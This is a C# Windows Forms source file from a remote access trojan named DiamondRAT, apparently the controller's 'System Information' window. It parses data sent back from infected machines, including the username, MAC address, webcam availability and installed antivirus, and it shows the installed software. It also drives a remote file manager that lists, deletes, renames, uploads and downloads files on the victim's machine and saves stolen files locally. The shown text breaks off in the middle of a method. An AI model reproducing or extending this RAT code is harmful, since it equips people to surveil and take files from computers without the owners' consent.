using Microsoft.VisualBasic;
using System;
using System.ComponentModel;
using System.IO;
using System.Windows.Forms;

namespace DiamondRAT
{
    class SystemInformation : MyForm
    {
        private IContainer components;

        private TabControl CodePlexTabControl1;
        private TabPage TabPage1;
        private TreeView TreeView1;
        private ImageList ImageList_Info;
        private ContextMenuStrip rightclick_Info;
        private ToolStripMenuItem RefreshToolStripMenuItem;
        private TabPage TabPage3;
        private ListBox ListBox_Software;
        private ContextMenuStrip rightclick_is;
        private ToolStripMenuItem ToolStripMenuItem2;
        private TabPage TabPage6;
        private TextBox TextBox1;
        private ComboBox ComboBox1;
        private ColumnHeader ColumnHeader7;
        private ColumnHeader ColumnHeader8;
        private ColumnHeader ColumnHeader9;
        private ColumnHeader ColumnHeader10;
        private PictureBox PictureBox2;
        private ImageList ImageList_FileManager;
        private ListView ListView_Files;
        private ContextMenuStrip rightclick_filemanagerfiles;
        private ToolStripMenuItem RefreshToolStripMenuItem1;
        private ToolStripMenuItem NewFolderToolStripMenuItem;
        private ToolStripMenuItem DeleteToolStripMenuItem;
        private ToolStripMenuItem RenameToolStripMenuItem;
        private ToolStripMenuItem DownloadFileToolStripMenuItem;
        private ToolStripMenuItem UploadFileToolStripMenuItem;

        public SystemInformation()
        {
            InitializeComponent();

            this.FormType = FormType.SystemInformation;
        }

        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && components != null)
                {
                    components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(SystemInformation));
            System.Windows.Forms.TreeNode treeNode1 = new System.Windows.Forms.TreeNode("Computer Name: ");
            System.Windows.Forms.TreeNode treeNode2 = new System.Windows.Forms.TreeNode("Username: ");
            System.Windows.Forms.TreeNode treeNode3 = new System.Windows.Forms.TreeNode("Virtual Screen Width: ");
            System.Windows.Forms.TreeNode treeNode4 = new System.Windows.Forms.TreeNode("Virtual Screen Height: ");
            System.Windows.Forms.TreeNode treeNode5 = new System.Windows.Forms.TreeNode("Available Physical Memory: ");
            System.Windows.Forms.TreeNode treeNode6 = new System.Windows.Forms.TreeNode("Available Virtual Memory: ");
            System.Windows.Forms.TreeNode treeNode7 = new System.Windows.Forms.TreeNode("OS Full Name: ");
            System.Windows.Forms.TreeNode treeNode8 = new System.Windows.Forms.TreeNode("OS Platform: ");
            System.Windows.Forms.TreeNode treeNode9 = new System.Windows.Forms.TreeNode("OS Version: ");
            System.Windows.Forms.TreeNode treeNode10 = new System.Windows.Forms.TreeNode("Total Physical Memory: ");
            System.Windows.Forms.TreeNode treeNode11 = new System.Windows.Forms.TreeNode("Total Virtual Memory: ");
            System.Windows.Forms.TreeNode treeNode12 = new System.Windows.Forms.TreeNode("Battery Charge Status: ");
            System.Windows.Forms.TreeNode treeNode13 = new System.Windows.Forms.TreeNode("Battery Full Lifetime: ");
            System.Windows.Forms.TreeNode treeNode14 = new System.Windows.Forms.TreeNode("Battery Life Percent: ");
            System.Windows.Forms.TreeNode treeNode15 = new System.Windows.Forms.TreeNode("Battery Life Remaining: ");
            System.Windows.Forms.TreeNode treeNode16 = new System.Windows.Forms.TreeNode("CPU Info: ");
            System.Windows.Forms.TreeNode treeNode17 = new System.Windows.Forms.TreeNode("GPU Name: ");
            System.Windows.Forms.TreeNode treeNode18 = new System.Windows.Forms.TreeNode("Uptime: ");
            System.Windows.Forms.TreeNode treeNode19 = new System.Windows.Forms.TreeNode("Computer Information", new System.Windows.Forms.TreeNode[] {
            treeNode1,
            treeNode2,
            treeNode3,
            treeNode4,
            treeNode5,
            treeNode6,
            treeNode7,
            treeNode8,
            treeNode9,
            treeNode10,
            treeNode11,
            treeNode12,
            treeNode13,
            treeNode14,
            treeNode15,
            treeNode16,
            treeNode17,
            treeNode18});
            System.Windows.Forms.TreeNode treeNode20 = new System.Windows.Forms.TreeNode("Registered Owner: ");
            System.Windows.Forms.TreeNode treeNode21 = new System.Windows.Forms.TreeNode("Registered Organization: ");
            System.Windows.Forms.TreeNode treeNode22 = new System.Windows.Forms.TreeNode("MAC Adress: ");
            System.Windows.Forms.TreeNode treeNode23 = new System.Windows.Forms.TreeNode("Webcam Available: ");
            System.Windows.Forms.TreeNode treeNode24 = new System.Windows.Forms.TreeNode("Installed AntiVirus Engine: ");
            System.Windows.Forms.TreeNode treeNode25 = new System.Windows.Forms.TreeNode("Server Location: ");
            System.Windows.Forms.TreeNode treeNode26 = new System.Windows.Forms.TreeNode("Other Information", new System.Windows.Forms.TreeNode[] {
            treeNode20,
            treeNode21,
            treeNode22,
            treeNode23,
            treeNode24,
            treeNode25});
            this.ImageList_Info = new System.Windows.Forms.ImageList(this.components);
            this.rightclick_Info = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.RefreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.rightclick_is = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.ToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.ImageList_FileManager = new System.Windows.Forms.ImageList(this.components);
            this.rightclick_filemanagerfiles = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.RefreshToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.NewFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.DeleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.RenameToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.DownloadFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.UploadFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.CodePlexTabControl1 = new System.Windows.Forms.TabControl();
            this.TabPage1 = new System.Windows.Forms.TabPage();
            this.TreeView1 = new System.Windows.Forms.TreeView();
            this.TabPage3 = new System.Windows.Forms.TabPage();
            this.ListBox_Software = new System.Windows.Forms.ListBox();
            this.TabPage6 = new System.Windows.Forms.TabPage();
            this.PictureBox2 = new System.Windows.Forms.PictureBox();
            this.ListView_Files = new System.Windows.Forms.ListView();
            this.ColumnHeader7 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.ColumnHeader8 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.ColumnHeader9 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.ColumnHeader10 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.TextBox1 = new System.Windows.Forms.TextBox();
            this.ComboBox1 = new System.Windows.Forms.ComboBox();
            this.rightclick_Info.SuspendLayout();
            this.rightclick_is.SuspendLayout();
            this.rightclick_filemanagerfiles.SuspendLayout();
            this.CodePlexTabControl1.SuspendLayout();
            this.TabPage1.SuspendLayout();
            this.TabPage3.SuspendLayout();
            this.TabPage6.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox2)).BeginInit();
            this.SuspendLayout();
            // 
            // ImageList_Info
            // 
            this.ImageList_Info.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("ImageList_Info.ImageStream")));
            this.ImageList_Info.TransparentColor = System.Drawing.Color.Transparent;
            this.ImageList_Info.Images.SetKeyName(0, "alarm-clock.png");
            this.ImageList_Info.Images.SetKeyName(1, "application-monitor.png");
            this.ImageList_Info.Images.SetKeyName(2, "battery.png");
            this.ImageList_Info.Images.SetKeyName(3, "battery-charge.png");
            this.ImageList_Info.Images.SetKeyName(4, "battery--exclamation.png");
            this.ImageList_Info.Images.SetKeyName(5, "graphic-card.png");
            this.ImageList_Info.Images.SetKeyName(6, "information.png");
            this.ImageList_Info.Images.SetKeyName(7, "information-white.png");
            this.ImageList_Info.Images.SetKeyName(8, "user.png");
            this.ImageList_Info.Images.SetKeyName(9, "resource-monitor.png");
            this.ImageList_Info.Images.SetKeyName(10, "processor.png");
            this.ImageList_Info.Images.SetKeyName(11, "monitor.png");
            this.ImageList_Info.Images.SetKeyName(12, "memory.png");
            this.ImageList_Info.Images.SetKeyName(13, "selection.png");
            this.ImageList_Info.Images.SetKeyName(14, "computer.png");
            this.ImageList_Info.Images.SetKeyName(15, "information-shield.png");
            this.ImageList_Info.Images.SetKeyName(16, "user-business.png");
            this.ImageList_Info.Images.SetKeyName(17, "home-medium.png");
            this.ImageList_Info.Images.SetKeyName(18, "address-book-blue.png");
            this.ImageList_Info.Images.SetKeyName(19, "webcam.png");
            this.ImageList_Info.Images.SetKeyName(20, "wall.png");
            this.ImageList_Info.Images.SetKeyName(21, "arrow.png");
            // 
            // rightclick_Info
            // 
            this.rightclick_Info.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.RefreshToolStripMenuItem});
            this.rightclick_Info.Name = "rightclick_Info";
            this.rightclick_Info.Size = new System.Drawing.Size(114, 26);
            // 
            // RefreshToolStripMenuItem
            // 
            this.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem";
            this.RefreshToolStripMenuItem.Size = new System.Drawing.Size(113, 22);
            this.RefreshToolStripMenuItem.Text = "Refresh";
            this.RefreshToolStripMenuItem.Click += new System.EventHandler(this.RefreshToolStripMenuItem_Click);
            // 
            // rightclick_is
            // 
            this.rightclick_is.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ToolStripMenuItem2});
            this.rightclick_is.Name = "rightclick_Info";
            this.rightclick_is.Size = new System.Drawing.Size(114, 26);
            // 
            // ToolStripMenuItem2
            // 
            this.ToolStripMenuItem2.Name = "ToolStripMenuItem2";
            this.ToolStripMenuItem2.Size = new System.Drawing.Size(113, 22);
            this.ToolStripMenuItem2.Text = "Refresh";
            this.ToolStripMenuItem2.Click += new System.EventHandler(this.ToolStripMenuItem2_Click);
            // 
            // ImageList_FileManager
            // 
            this.ImageList_FileManager.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("ImageList_FileManager.ImageStream")));
            this.ImageList_FileManager.TransparentColor = System.Drawing.Color.Transparent;
            this.ImageList_FileManager.Images.SetKeyName(0, "folder-horizontal.png");
            this.ImageList_FileManager.Images.SetKeyName(1, "application-blue.png");
            // 
            // rightclick_filemanagerfiles
            // 
            this.rightclick_filemanagerfiles.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.RefreshToolStripMenuItem1,
            this.NewFolderToolStripMenuItem,
            this.DeleteToolStripMenuItem,
            this.RenameToolStripMenuItem,
            this.DownloadFileToolStripMenuItem,
            this.UploadFileToolStripMenuItem});
            this.rightclick_filemanagerfiles.Name = "rightclick_filemanagerfiles";
            this.rightclick_filemanagerfiles.Size = new System.Drawing.Size(150, 136);
            // 
            // RefreshToolStripMenuItem1
            // 
            this.RefreshToolStripMenuItem1.BackColor = System.Drawing.Color.White;
            this.RefreshToolStripMenuItem1.ForeColor = System.Drawing.Color.Black;
            this.RefreshToolStripMenuItem1.Name = "RefreshToolStripMenuItem1";
            this.RefreshToolStripMenuItem1.Size = new System.Drawing.Size(149, 22);
            this.RefreshToolStripMenuItem1.Text = "Refresh";
            this.RefreshToolStripMenuItem1.Click += new System.EventHandler(this.RefreshToolStripMenuItem1_Click);
            // 
            // NewFolderToolStripMenuItem
            // 
            this.NewFolderToolStripMenuItem.BackColor = System.Drawing.Color.White;
            this.NewFolderToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
            this.NewFolderToolStripMenuItem.Name = "NewFolderToolStripMenuItem";
            this.NewFolderToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
            this.NewFolderToolStripMenuItem.Text = "New Folder";
            this.NewFolderToolStripMenuItem.Click += new System.EventHandler(this.NewFolderToolStripMenuItem_Click);
            // 
            // DeleteToolStripMenuItem
            // 
            this.DeleteToolStripMenuItem.BackColor = System.Drawing.Color.White;
            this.DeleteToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
            this.DeleteToolStripMenuItem.Name = "DeleteToolStripMenuItem";
            this.DeleteToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
            this.DeleteToolStripMenuItem.Text = "Delete";
            this.DeleteToolStripMenuItem.Click += new System.EventHandler(this.DeleteToolStripMenuItem_Click);
            // 
            // RenameToolStripMenuItem
            // 
            this.RenameToolStripMenuItem.BackColor = System.Drawing.Color.White;
            this.RenameToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
            this.RenameToolStripMenuItem.Name = "RenameToolStripMenuItem";
            this.RenameToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
            this.RenameToolStripMenuItem.Text = "Rename";
            this.RenameToolStripMenuItem.Click += new System.EventHandler(this.RenameToolStripMenuItem_Click);
            // 
            // DownloadFileToolStripMenuItem
            // 
            this.DownloadFileToolStripMenuItem.BackColor = System.Drawing.Color.White;
            this.DownloadFileToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
            this.DownloadFileToolStripMenuItem.Name = "DownloadFileToolStripMenuItem";
            this.DownloadFileToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
            this.DownloadFileToolStripMenuItem.Text = "Download File";
            this.DownloadFileToolStripMenuItem.Click += new System.EventHandler(this.DownloadFileToolStripMenuItem_Click);
            // 
            // UploadFileToolStripMenuItem
            // 
            this.UploadFileToolStripMenuItem.BackColor = System.Drawing.Color.White;
            this.UploadFileToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
            this.UploadFileToolStripMenuItem.Name = "UploadFileToolStripMenuItem";
            this.UploadFileToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
            this.UploadFileToolStripMenuItem.Text = "Upload File";
            this.UploadFileToolStripMenuItem.Click += new System.EventHandler(this.UploadFileToolStripMenuItem_Click);
            // 
            // CodePlexTabControl1
            // 
            this.CodePlexTabControl1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.CodePlexTabControl1.Controls.Add(this.TabPage1);
            this.CodePlexTabControl1.Controls.Add(this.TabPage3);
            this.CodePlexTabControl1.Controls.Add(this.TabPage6);
            this.CodePlexTabControl1.Location = new System.Drawing.Point(0, 0);
            this.CodePlexTabControl1.Name = "CodePlexTabControl1";
            this.CodePlexTabControl1.SelectedIndex = 0;
            this.CodePlexTabControl1.Size = new System.Drawing.Size(838, 479);
            this.CodePlexTabControl1.TabIndex = 0;
            // 
            // TabPage1
            // 
            this.TabPage1.Controls.Add(this.TreeView1);
            this.TabPage1.Location = new System.Drawing.Point(4, 22);
            this.TabPage1.Name = "TabPage1";
            this.TabPage1.Padding = new System.Windows.Forms.Padding(3);
            this.TabPage1.Size = new System.Drawing.Size(830, 453);
            this.TabPage1.TabIndex = 0;
            this.TabPage1.Text = "Main Info";
            this.TabPage1.UseVisualStyleBackColor = true;
            // 
            // TreeView1
            // 
            this.TreeView1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.TreeView1.ContextMenuStrip = this.rightclick_Info;
            this.TreeView1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.TreeView1.ImageIndex = 13;
            this.TreeView1.ImageList = this.ImageList_Info;
            this.TreeView1.Location = new System.Drawing.Point(0, 0);
            this.TreeView1.Name = "TreeView1";
            treeNode1.ImageKey = "information-white.png";
            treeNode1.Name = "computername";
            treeNode1.SelectedImageKey = "information-white.png";
            treeNode1.Text = "Computer Name: ";
            treeNode2.ImageKey = "user.png";
            treeNode2.Name = "username";
            treeNode2.SelectedImageKey = "user.png";
            treeNode2.Text = "Username: ";
            treeNode3.ImageKey = "monitor.png";
            treeNode3.Name = "width";
            treeNode3.SelectedImageKey = "monitor.png";
            treeNode3.Text = "Virtual Screen Width: ";
            treeNode4.ImageKey = "monitor.png";
            treeNode4.Name = "height";
            treeNode4.SelectedImageKey = "monitor.png";
            treeNode4.Text = "Virtual Screen Height: ";
            treeNode5.ImageKey = "memory.png";
            treeNode5.Name = "apm";
            treeNode5.SelectedImageKey = "memory.png";
            treeNode5.Text = "Available Physical Memory: ";
            treeNode6.ImageKey = "memory.png";
            treeNode6.Name = "avm";
            treeNode6.SelectedImageKey = "memory.png";
            treeNode6.Text = "Available Virtual Memory: ";
            treeNode7.ImageKey = "application-monitor.png";
            treeNode7.Name = "osname";
            treeNode7.SelectedImageKey = "application-monitor.png";
            treeNode7.Text = "OS Full Name: ";
            treeNode8.ImageKey = "application-monitor.png";
            treeNode8.Name = "osplattform";
            treeNode8.SelectedImageKey = "application-monitor.png";
            treeNode8.Text = "OS Platform: ";
            treeNode9.ImageKey = "application-monitor.png";
            treeNode9.Name = "osversion";
            treeNode9.SelectedImageKey = "application-monitor.png";
            treeNode9.Text = "OS Version: ";
            treeNode10.ImageKey = "resource-monitor.png";
            treeNode10.Name = "tpm";
            treeNode10.SelectedImageKey = "resource-monitor.png";
            treeNode10.Text = "Total Physical Memory: ";
            treeNode11.ImageKey = "resource-monitor.png";
            treeNode11.Name = "tvm";
            treeNode11.SelectedImageKey = "resource-monitor.png";
            treeNode11.Text = "Total Virtual Memory: ";
            treeNode12.ImageKey = "battery-charge.png";
            treeNode12.Name = "BCS";
            treeNode12.SelectedImageKey = "battery-charge.png";
            treeNode12.Text = "Battery Charge Status: ";
            treeNode13.ImageKey = "battery.png";
            treeNode13.Name = "bfl";
            treeNode13.SelectedImageKey = "battery.png";
            treeNode13.Text = "Battery Full Lifetime: ";
            treeNode14.ImageKey = "battery.png";
            treeNode14.Name = "blp";
            treeNode14.SelectedImageKey = "battery.png";
            treeNode14.Text = "Battery Life Percent: ";
            treeNode15.ImageKey = "battery--exclamation.png";
            treeNode15.Name = "blr";
            treeNode15.SelectedImageKey = "battery--exclamation.png";
            treeNode15.Text = "Battery Life Remaining: ";
            treeNode16.ImageKey = "processor.png";
            treeNode16.Name = "cpu";
            treeNode16.SelectedImageKey = "processor.png";
            treeNode16.Text = "CPU Info: ";
            treeNode17.ImageKey = "graphic-card.png";
            treeNode17.Name = "gpu";
            treeNode17.SelectedImageKey = "graphic-card.png";
            treeNode17.Text = "GPU Name: ";
            treeNode18.ImageKey = "application-monitor.png";
            treeNode18.Name = "uptime";
            treeNode18.SelectedImageKey = "application-monitor.png";
            treeNode18.Text = "Uptime: ";
            treeNode19.ImageKey = "computer.png";
            treeNode19.Name = "Knoten0";
            treeNode19.SelectedImageKey = "computer.png";
            treeNode19.Text = "Computer Information";
            treeNode20.ImageKey = "user-business.png";
            treeNode20.Name = "Knoten1";
            treeNode20.SelectedImageKey = "user-business.png";
            treeNode20.Text = "Registered Owner: ";
            treeNode21.ImageKey = "home-medium.png";
            treeNode21.Name = "Knoten0";
            treeNode21.SelectedImageKey = "home-medium.png";
            treeNode21.Text = "Registered Organization: ";
            treeNode22.ImageKey = "address-book-blue.png";
            treeNode22.Name = "Knoten2";
            treeNode22.SelectedImageKey = "address-book-blue.png";
            treeNode22.Text = "MAC Adress: ";
            treeNode23.ImageKey = "webcam.png";
            treeNode23.Name = "Knoten3";
            treeNode23.SelectedImageKey = "webcam.png";
            treeNode23.Text = "Webcam Available: ";
            treeNode24.ImageKey = "wall.png";
            treeNode24.Name = "Knoten4";
            treeNode24.SelectedImageKey = "wall.png";
            treeNode24.Text = "Installed AntiVirus Engine: ";
            treeNode25.ImageKey = "arrow.png";
            treeNode25.Name = "Knoten5";
            treeNode25.SelectedImageKey = "arrow.png";
            treeNode25.Text = "Server Location: ";
            treeNode26.ImageKey = "information-shield.png";
            treeNode26.Name = "Knoten0";
            treeNode26.SelectedImageKey = "information-shield.png";
            treeNode26.Text = "Other Information";
            this.TreeView1.Nodes.AddRange(new System.Windows.Forms.TreeNode[] {
            treeNode19,
            treeNode26});
            this.TreeView1.SelectedImageIndex = 13;
            this.TreeView1.ShowNodeToolTips = true;
            this.TreeView1.Size = new System.Drawing.Size(827, 453);
            this.TreeView1.TabIndex = 1;
            // 
            // TabPage3
            // 
            this.TabPage3.Controls.Add(this.ListBox_Software);
            this.TabPage3.Location = new System.Drawing.Point(4, 22);
            this.TabPage3.Name = "TabPage3";
            this.TabPage3.Size = new System.Drawing.Size(830, 453);
            this.TabPage3.TabIndex = 2;
            this.TabPage3.Text = "Installed Software";
            this.TabPage3.UseVisualStyleBackColor = true;
            // 
            // ListBox_Software
            // 
            this.ListBox_Software.ContextMenuStrip = this.rightclick_is;
            this.ListBox_Software.Dock = System.Windows.Forms.DockStyle.Fill;
            this.ListBox_Software.FormattingEnabled = true;
            this.ListBox_Software.Location = new System.Drawing.Point(0, 0);
            this.ListBox_Software.Name = "ListBox_Software";
            this.ListBox_Software.Size = new System.Drawing.Size(830, 453);
            this.ListBox_Software.TabIndex = 0;
            // 
            // TabPage6
            // 
            this.TabPage6.Controls.Add(this.PictureBox2);
            this.TabPage6.Controls.Add(this.ListView_Files);
            this.TabPage6.Controls.Add(this.TextBox1);
            this.TabPage6.Controls.Add(this.ComboBox1);
            this.TabPage6.Location = new System.Drawing.Point(4, 22);
            this.TabPage6.Name = "TabPage6";
            this.TabPage6.Size = new System.Drawing.Size(830, 453);
            this.TabPage6.TabIndex = 5;
            this.TabPage6.Text = "File Manager";
            this.TabPage6.UseVisualStyleBackColor = true;
            // 
            // PictureBox2
            // 
            this.PictureBox2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.PictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("PictureBox2.Image")));
            this.PictureBox2.Location = new System.Drawing.Point(802, 4);
            this.PictureBox2.Name = "PictureBox2";
            this.PictureBox2.Size = new System.Drawing.Size(25, 25);
            this.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.PictureBox2.TabIndex = 4;
            this.PictureBox2.TabStop = false;
            this.PictureBox2.Click += new System.EventHandler(this.PictureBox2_Click);
            // 
            // ListView_Files
            // 
            this.ListView_Files.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.ListView_Files.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.ColumnHeader7,
            this.ColumnHeader8,
            this.ColumnHeader9,
            this.ColumnHeader10});
            this.ListView_Files.ContextMenuStrip = this.rightclick_filemanagerfiles;
            this.ListView_Files.HideSelection = false;
            this.ListView_Files.Location = new System.Drawing.Point(3, 32);
            this.ListView_Files.Name = "ListView_Files";
            this.ListView_Files.Size = new System.Drawing.Size(824, 418);
            this.ListView_Files.SmallImageList = this.ImageList_FileManager;
            this.ListView_Files.TabIndex = 2;
            this.ListView_Files.UseCompatibleStateImageBehavior = false;
            this.ListView_Files.View = System.Windows.Forms.View.Details;
            this.ListView_Files.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.ListView_Files_MouseDoubleClick);
            // 
            // ColumnHeader7
            // 
            this.ColumnHeader7.Text = "Files";
            this.ColumnHeader7.Width = 360;
            // 
            // ColumnHeader8
            // 
            this.ColumnHeader8.Text = "Creation Time";
            this.ColumnHeader8.Width = 161;
            // 
            // ColumnHeader9
            // 
            this.ColumnHeader9.Text = "Last Access Time";
            this.ColumnHeader9.Width = 182;
            // 
            // ColumnHeader10
            // 
            this.ColumnHeader10.Text = "File Size";
            this.ColumnHeader10.Width = 98;
            // 
            // TextBox1
            // 
            this.TextBox1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.TextBox1.Location = new System.Drawing.Point(78, 6);
            this.TextBox1.Name = "TextBox1";
            this.TextBox1.Size = new System.Drawing.Size(722, 20);
            this.TextBox1.TabIndex = 1;
            this.TextBox1.KeyDown += new System.Windows.Forms.KeyEventHandler(this.TextBox1_KeyDown);
            // 
            // ComboBox1
            // 
            this.ComboBox1.FormattingEnabled = true;
            this.ComboBox1.Location = new System.Drawing.Point(3, 6);
            this.ComboBox1.Name = "ComboBox1";
            this.ComboBox1.Size = new System.Drawing.Size(73, 21);
            this.ComboBox1.TabIndex = 0;
            this.ComboBox1.SelectedIndexChanged += new System.EventHandler(this.ComboBox1_SelectedIndexChanged);
            this.ComboBox1.Click += new System.EventHandler(this.ComboBox1_Click);
            // 
            // SystemInformation
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(837, 479);
            this.Controls.Add(this.CodePlexTabControl1);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "SystemInformation";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "System Information - ";
            this.Load += new System.EventHandler(this.SystemInformation_Load);
            this.rightclick_Info.ResumeLayout(false);
            this.rightclick_is.ResumeLayout(false);
            this.rightclick_filemanagerfiles.ResumeLayout(false);
            this.CodePlexTabControl1.ResumeLayout(false);
            this.TabPage1.ResumeLayout(false);
            this.TabPage3.ResumeLayout(false);
            this.TabPage6.ResumeLayout(false);
            this.TabPage6.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox2)).EndInit();
            this.ResumeLayout(false);

        }

        string _currentDir = "";
        string _currentDownloadFileName = "";

        public override void ProcessMsg(string msg)
        {
            if (msg.StartsWith("SystemInformation"))
                AddSysteminformation(msg.Replace("SystemInformation", ""));
            else if (msg.StartsWith("InstalledSoftware"))
                AddInstalledSoftware(msg.Replace("InstalledSoftware", ""));
            else if (msg.StartsWith("Drives"))
                AddDrives(msg.Replace("Drives", ""));
            else if (msg.StartsWith("FileManagerFiles"))
                AddFiles(msg.Replace("FileManagerFiles", ""));
            else if (msg.StartsWith("IncomingFile"))
            {
                string dir = Application.StartupPath + "\\Download_Files\\";
                if (!Directory.Exists(dir))
                    Directory.CreateDirectory(dir);
                dir += this.Text.Replace("System Information - ", "") + "\\";
                if (!Directory.Exists(dir))
                    Directory.CreateDirectory(dir);

                File.WriteAllBytes(dir + _currentDownloadFileName, Convert.FromBase64String(msg.Replace("IncomingFile", "")));
            }
        }

        private void AddSysteminformation(string text)
        {
            TreeView1.Nodes[0].Nodes[0].Text = "Computer Name: " + text.Split('|')[1];
            TreeView1.Nodes[0].Nodes[1].Text = "User Name: " + text.Split('|')[2];
            TreeView1.Nodes[0].Nodes[2].Text = "Virtual Screen Width: " + text.Split('|')[3];
            TreeView1.Nodes[0].Nodes[3].Text = "Virtual Screen Height: " + text.Split('|')[4];
            TreeView1.Nodes[0].Nodes[4].Text = "Available Physical Memory: " + text.Split('|')[5];
            TreeView1.Nodes[0].Nodes[5].Text = "Available Virtual Memory: " + text.Split('|')[6];
            TreeView1.Nodes[0].Nodes[6].Text = "OS Full Name: " + text.Split('|')[7];
            TreeView1.Nodes[0].Nodes[7].Text = "OS Platform: " + text.Split('|')[8];
            TreeView1.Nodes[0].Nodes[8].Text = "OS Version: " + text.Split('|')[9];
            TreeView1.Nodes[0].Nodes[9].Text = "Total Physical Memory: " + text.Split('|')[10];
            TreeView1.Nodes[0].Nodes[10].Text = "Total Virtual Memory: " + text.Split('|')[11];
            TreeView1.Nodes[0].Nodes[11].Text = "Battery Charge Status: " + text.Split('|')[12];
            TreeView1.Nodes[0].Nodes[12].Text = "Battery Full Lifetime: " + text.Split('|')[13];
            TreeView1.Nodes[0].Nodes[13].Text = "Battery Life Percent: " + text.Split('|')[14];
            TreeView1.Nodes[0].Nodes[14].Text = "Battery Life Remaining: " + text.Split('|')[15];
            TreeView1.Nodes[0].Nodes[15].Text = "CPU Info: " + text.Split('|')[16];
            TreeView1.Nodes[0].Nodes[16].Text = "GPU Name: " + text.Split('|')[17];
            TreeView1.Nodes[0].Nodes[17].Text = "Uptime: " + text.Split('|')[18];
            TreeView1.Nodes[1].Nodes[0].Text = "Registered Owner: " + text.Split('|')[19];
            TreeView1.Nodes[1].Nodes[1].Text = "Registered Organization: " + text.Split('|')[20];
            string text2 = text.Split('|')[22];
            int num = text2.Length + 2;
            for (int i = 2; i <= num; i += 3)
            {
                text2 = text2.Insert(i, ":");
            }
            TreeView1.Nodes[1].Nodes[2].Text = "MAC Adress: " + text2;
            TreeView1.Nodes[1].Nodes[3].Text = "Webcam Available: " + text.Split('|')[23];
            TreeView1.Nodes[1].Nodes[4].Text = "Installed AntiVirus Engine: " + text.Split('|')[24];
            TreeView1.Nodes[1].Nodes[5].Text = "Server Location: " + text.Split('|')[25];
        }

        private void AddInstalledSoftware(string txt)
        {
            ListBox_Software.Items.Clear();
            string[] softs = txt.Split(new string[] { "|" }, StringSplitOptions.RemoveEmptyEntries);
            for (int i = 0; i < softs.Length; i++)
            {
                ListBox_Software.Items.Add(softs[i]);
            }
        }

        private void AddDrives(string txt)
        {
            try
            {
                int num = utils.CountCharacter(txt, '|') - 1;
                for (int i = 0; i <= num; i++)
                {
                    ComboBox1.Items.Add(txt.Split('|')[i]);
                }
            }
            catch (Exception ex)
            {

            }
        }

        private void AddFiles(string txt)
        {
            try
            {
                string[] lines = new TextBox
                {
                    Text = txt
                }.Lines;

                for (int i = 0; i < lines.Length; i = checked(i + 1))
                {
                    string[] array = lines[i].Split('|');
                    string text = array[0];
                    string text1 = array[1];
                    string text2 = array[2];
